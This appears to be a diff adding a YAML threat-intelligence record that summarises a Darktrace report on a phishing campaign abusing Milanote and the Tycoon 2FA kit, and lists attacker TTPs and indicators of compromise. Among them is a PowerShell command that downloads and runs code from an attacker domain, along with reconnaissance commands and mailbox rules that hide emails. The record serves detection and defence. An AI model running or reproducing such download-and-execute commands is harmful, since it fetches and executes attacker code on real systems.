@@ -1,0 +1,45 @@
+description: In late 2024 and early 2025, Darktrace SOC investigated SaaS account
+  compromises on two customer environments suggesting a wider phishing campaign leveraging
+  Milanote and the Tycoon 2FA phishing kit.
+attribution: Unknown
+malware_families:
+- Tycoon 2FA
+- Mamba 2FA
+authors:
+- Darktrace
+TTPs:
+  processes:
+  - powershell.exe
+  commandline:
+  - powershell.exe "IEX (New-Object Net.WebClient).DownloadString(\"http://alrn.ialeahed[.]com/u001.qLX9yCzR\")"
+  - systeminfo|out-string
+  powershell:
+  - IEX (New-Object Net.WebClient).DownloadString("http://alrn.ialeahed[.]com/u001.qLX9yCzR")
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: powershell.exe
+    destination_address: alrn.ialeahed[.]com
+    port: ''
+  - executable: powershell.exe
+    destination_address: 193.36.38.237
+    port: '8080'
+  file_activity:
+  - C:\\WINDOWS\\system32\\config\\system
+  persistence:
+  - New mailbox rule named "GTH" that deletes any incoming email containing the string
+    "milanote" in the subject line or body.
+  - New mailbox rule named "GFH" to delete emails with "milanote".
+  - New mailbox rule named "GVB" to delete emails with "milanote".
+  pipes: []
+  process_relations: []
+IOCs:
+- alrn.ialeahed[.]com
+- 89.185.80[.]19
+- 5.181.3[.]68
+- 38.242.7[.]252
+- support@milanote[.]com
+- aahnermatternk.ef.od.13@gmail[.]com
+reference: https://www.darktrace.com/blog/mfa-under-attack-aitm-phishing-kits-abusing-legitimate-services
+date_of_publication: April 29, 2025
+file_creation_date: June 05, 2025
